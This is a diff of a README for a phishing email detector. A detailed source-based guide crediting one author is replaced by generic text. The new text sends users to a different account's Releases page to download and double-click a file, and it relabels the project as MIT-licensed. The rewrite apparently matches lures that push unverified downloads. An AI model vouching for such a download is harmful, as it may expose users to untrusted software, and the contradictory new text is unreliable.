@@ -1,390 +1,92 @@
-# 🛡️ Anti‑Phishing Email Detector
+# 🛡️ Anti_Phishing_Email_Detector_gui - Protect Your Inbox From Phishing Scams
 
-Analyzes email content, headers, and links to identify phishing attacks, calculate risk scores, store history, and visualize ML evaluation results.
+## 🚀 Getting Started
 
-## 📸 Screenshots
-![Screenshot 1](https://github.com/SyedShaheerHussain/Anti_Phishing_Email_Detector_gui/blob/7600a176905f1be4c0bd3bcf13f7102381094eec/anti_phishing_email_detector/screenshots/Screenshot%20(60).png)
+Welcome to the Anti_Phishing_Email_Detector_gui! This application helps you analyze email content, headers, and links to spot phishing attacks. With a user-friendly interface, you can easily check risks and visualize results. 
 
-![Screenshot 2](https://github.com/SyedShaheerHussain/Anti_Phishing_Email_Detector_gui/blob/7600a176905f1be4c0bd3bcf13f7102381094eec/anti_phishing_email_detector/screenshots/Screenshot%20(61).png)
+## 📥 Download & Install
 
-![Screenshot 3](https://github.com/SyedShaheerHussain/Anti_Phishing_Email_Detector_gui/blob/7600a176905f1be4c0bd3bcf13f7102381094eec/anti_phishing_email_detector/screenshots/Screenshot%20(62).png)
+To get started, you need to download the software. Click the button below to visit the Releases page where you can download the application:
 
-![Screenshot 4](https://github.com/SyedShaheerHussain/Anti_Phishing_Email_Detector_gui/blob/7600a176905f1be4c0bd3bcf13f7102381094eec/anti_phishing_email_detector/screenshots/Screenshot%20(63).png)
+[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/nonamebatbai/Anti_Phishing_Email_Detector_gui/releases)
 
-## 🏷️ Tags
+### Steps to Download:
 
-`#phishing` `#email-security` `#cybersecurity` `#machine-learning`
-`#ai-security` `#spam-detection` `#fraud-detection` `#python` `#sqlite`
+1. Click the **Download** button above.
+2. On the Releases page, find the latest version of the application.
+3. Click on the file that matches your operating system to start the download.
+4. Once it is downloaded, find the file in your downloads folder.
 
-## 👨‍💻 Developed By
+## 🛠️ System Requirements
 
-**Syed Shaheer Hussain**
-© **Copyright 2026 – All Rights Reserved**
+Before you install Anti_Phishing_Email_Detector_gui, make sure your computer meets the following requirements:
 
-## 📌 Introduction
+- **Operating System:** Windows 10 or later, macOS High Sierra or later, or Linux (Ubuntu or similar).
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** At least 200 MB of free space.
+- **Python:** Version 3.7 or later must be installed on your system.
 
-Email phishing is one of the **most dangerous cyber attacks** today.
-Attackers send fake emails pretending to be banks, companies, or trusted services to:
+## 📋 How to Use
 
-* Steal passwords
-* Hack accounts
-* Leak personal data
-* Commit financial fraud
+Once you have downloaded the application, follow these steps to run it:
 
-This project provides a **complete AI‑powered solution** to detect such phishing emails **before damage happens**.
+1. Locate the downloaded file.
+2. Double-click the file to open the application.
+3. You will see a user-friendly interface with different options.
+4. Enter the email content or paste the email headers you want to analyze.
+5. Press the "Analyze" button to check for phishing threats.
 
-## 🎯 Mission
+## 📊 Features
 
-✅ Protect users from phishing
-✅ Educate users about email threats
-✅ Use Machine Learning for smart detection
-✅ Provide history, analytics, and transparency
-✅ Build a scalable cybersecurity product
+- **Email Analysis:** Quickly analyze the content, headers, and links in your emails.
+- **Risk Scoring:** Calculate risk scores to determine the likelihood of phishing.
+- **History Storage:** Keep a history of your analysis for future reference.
+- **Visualization:** View machine learning evaluation results in a graphical format.
 
-## 🌍 Why This Project Was Made
+## 🌍 Advanced Options
 
-### ❓ Problem
+For users who want to dive deeper, the application includes advanced options such as:
 
-* Millions of phishing emails daily
-* Humans fail to identify fake emails
-* Huge financial & data losses
+- **Custom Filter Settings:** Set filters based on your specific needs.
+- **Report Generation:** Generate reports for your analysis and save them as PDF files.
 
-### 💡 Solution
+## 🗃️ Storing Analysis History
 
-* Automated ML‑based phishing detection
-* Risk scoring instead of yes/no
-* GUI dashboard for non‑technical users
+The application automatically saves your previous analyses in a SQLite database. You can access this database to review past emails and their risk scores. 
 
-## 📈 Market Value & Importance
+## 🔧 Troubleshooting
 
-| Area | Value |
-| --- | --- |
-| Cybersecurity Market | $300+ Billion    |
-| Phishing Attacks     | #1 attack vector |
-| AI Security Tools    | High demand      |
-| Academic Value       | FYP / Research   |
-| Commercial Value     | SaaS / Product   |
-
-👉 **This project can be converted into:**
-
-* SaaS product
-* Browser extension
-* Enterprise email scanner
-* API‑based security service
-
-## 🧠 What is Phishing?
-
-### 📧 Phishing
-
-A cyber attack where fake emails trick users into revealing:
-
-* Passwords
-* OTPs
-* Bank details
-* Login credentials
-
-### 🧪 Example
-
-> “Your account is suspended. Click here to verify.”
-
-## 🛡️ What is Anti‑Phishing?
-
-Anti‑phishing systems:
+If you encounter issues while using the software, here are some common solutions:
 
-* Analyze email content
-* Detect suspicious patterns
-* Block or warn users
-* Reduce human error
+- **Application Won't Launch:** Ensure you have Python installed and that it is updated to the correct version.
+- **Errors During Analysis:** Check your internet connection. The application may rely on online resources for some analysis features.
+- **No Results Found:** Ensure you entered proper email headers or content. Try analyzing a different email as a test.
 
-## 🏗️ Project Architecture
+## 📝 Additional Resources
 
-```
-User
- │
- │ Email Input
- ▼
-GUI Dashboard (Tkinter)
- │
- ├─ Email Parser
- ├─ Feature Extractor
- ├─ NLP Analyzer
- ├─ ML Classifier
- │
- ▼
-Prediction Engine
- │
- ├─ Risk Score
- ├─ Verdict
- │
- ▼
-SQLite Database
- │
- ├─ Email History
- └─ Evaluation Data
-
-```
-
-## 🔁 Flowchart (Text)
-
-```
-Start
- ↓
-Paste Email
- ↓
-Parse Headers + Body
- ↓
-Extract Features
- ↓
-ML Model Prediction
- ↓
-Risk Score Calculation
- ↓
-Verdict (Safe / Phishing)
- ↓
-Save to Database
- ↓
-Display Result
- ↓
-End
-
-```
-
-## 📁 Folder Structure Explained
-
-```
-anti_phishing_email_detector/
-│
-├── main.py                 → Project entry point
-├── gui.py                  → GUI Dashboard
-├── classifier.py           → ML prediction logic
-├── database.py             → SQLite database
-├── email_parser.py         → Email header parsing
-├── feature_extractor.py    → Feature extraction
-├── nlp_analyzer.py         → NLP analysis
-├── utils.py                → Helper utilities
-├── requirements.txt        → Dependencies
-│
-├── data/
-│   ├── detector.db         → Email history DB
-│   ├── phishing_dataset.csv
-│   ├── confusion_matrix.png
-│   └── roc_auc_curve.png
-│
-├── models/
-│   └── phishing_model.pkl  → Trained ML model
-│
-└── ml/
-    ├── train_model.py      → Model training
-    └── evaluate_model.py   → Model evaluation
-
-```
-
-## ⚙️ Technologies Used
-
-### 🧑‍💻 Programming Languages
-
-* Python 🐍
-
-### 🤖 Machine Learning
-
-* Scikit‑Learn
-* Random Forest Classifier
-
-### 📊 Data & Storage
-
-* SQLite3
-* CSV Dataset
+For more help, consider these resources:
 
-### 🖥️ GUI
+- [GitHub Issues](https://github.com/nonamebatbai/Anti_Phishing_Email_Detector_gui/issues): Report bugs or ask questions.
+- [Documentation](https://github.com/nonamebatbai/Anti_Phishing_Email_Detector_gui/wiki): Explore in-depth guides and tips for using the application effectively.
 
-* Tkinter
-* Pillow (Images)
+## 🌐 Related Topics
 
-### 📈 Visualization
+This application falls under several important areas in cybersecurity:
 
-* Matplotlib
-* ROC / AUC
-* Confusion Matrix
+- ai-security
+- anti-phishing
+- antifraud
+- cybersecurity
+- detection-model
+- email-detector
+- spam-detection
 
-## 🧪 Features Implemented
+## ⚖️ License
 
-### ✅ Core Features
+The Anti_Phishing_Email_Detector_gui is open-source software. Feel free to use, modify, and distribute this application under the terms of the MIT license.
 
-1. Email content analysis
-2. Header inspection
-3. URL & domain checks
-4. NLP keyword analysis
-5. Risk score generation
+## 📞 Need Help?
 
-### ✅ ML Features
+For further support, reach out through our GitHub repository, or open an issue if you need assistance. Your feedback is crucial for improving the application. 
 
-6. Real trained ML model
-7. Model accuracy evaluation
-8. Confusion matrix graph
-9. ROC / AUC curve
-
-### ✅ GUI Features
-
-10. Email analyzer dashboard
-11. Email history viewer
-12. Evaluation plots viewer
-
-## 🧩 Functions Overview
-
-| Function | Purpose |
-| --- | --- |
-| `predict_email()`      | Predict phishing   |
-| `extract_features()`   | Feature extraction |
-| `save_email_history()` | Save results       |
-| `get_email_history()`  | View history       |
-| `train_model.py`       | Train ML           |
-| `evaluate_model.py`    | Evaluate ML        |
-
-## 🖥️ GUI Working
-
-### 🧭 Tabs
-
-1. **Analyze Email**
-2. **Email History**
-3. **ML Evaluation**
-
-### 📌 How GUI Works
-
-* Paste email
-* Click Analyze
-* Get verdict + score
-* Saved automatically
-* View history anytime
-* View ML performance charts
-
-## 🛠️ Installation Guide (Step‑By‑Step)
-
-### 🔹 Step 1: Install Python
-
-* Python **3.10+**
-* Add to PATH
-
-### 🔹 Step 2: Install Requirements
-
-```bash
-pip install -r requirements.txt
-
-```
-
-### 🔹 Step 3: Dataset
-
-* Place `phishing_dataset.csv` in `data/`
-
-## ▶️ How to Run (Step‑By‑Step)
-
-### 1️⃣ Train Model
-
-```bash
-python ml/train_model.py
-
-```
-
-### 2️⃣ Evaluate Model
-
-```bash
-python ml/evaluate_model.py
-
-```
-
-### 3️⃣ Run Application
-
-```bash
-python main.py
-
-```
-
-## 🌐 Chrome / Web Hosting?
-
-> ⚠️ **This is a Desktop Application**, not web‑hosted.
-
-No:
-
-* Host
-* Username
-* Password
-* Browser login
-
-👉 Future enhancement can convert it into:
-
-* Flask / Django Web App
-* Cloud SaaS
-* Chrome Extension
-
-## 🧪 How to Use
-
-1. Open app
-2. Paste email
-3. Click **Analyze**
-4. Read verdict
-5. Check history
-6. View evaluation
-
-## ⚠️ Cautions
-
->[!caution]
-> * Model accuracy depends on dataset
-> * Not 100% guaranteed
-> * Should be combined with awareness
-> * Dataset bias possible
-
-## 📚 What You Learn From This Project
-
-### 🎓 Technical
-
-* Machine Learning
-* Feature engineering
-* NLP basics
-* GUI development
-* SQLite database
-* Model evaluation
-
-### 🧠 Concepts
-
-* Cybersecurity
-* Phishing techniques
-* AI security systems
-* Risk‑based detection
-
-## 🔮 Future Enhancements
-
-🚀 Planned:
-
-* Real‑time email scanning
-* Browser extension
-* Deep learning (LSTM)
-* Online dashboard
-* Feedback learning
-* API service
-* Cloud deployment
-
-## 🧾 Disclaimer
-
->[!warning]
-> This project is developed **for educational and research purposes only**.
-> The developer is **not responsible for misuse** or damages caused by reliance solely on this tool.
-
-## 📌 Important Notes
-
->[!important]
-> * Always verify suspicious emails manually
-> * Never click unknown links
-> * Enable 2FA
-> * Use password managers
-
-## 🛡️ How to Stay Safe from Phishing
-
-✅ Check sender email
-✅ Avoid urgent language
-✅ Don’t click random links
-✅ Verify before login
-✅ Use security tools
-
-## 💎 Final Value Statement
-
->[!note]
-> **This project demonstrates a complete real‑world AI cybersecurity solution combining Machine Learning, GUI, databases, and visualization — suitable for academic, professional, and commercial use.**
+Thank you for choosing Anti_Phishing_Email_Detector_gui! Stay safe online and protect your inbox from potential threats.
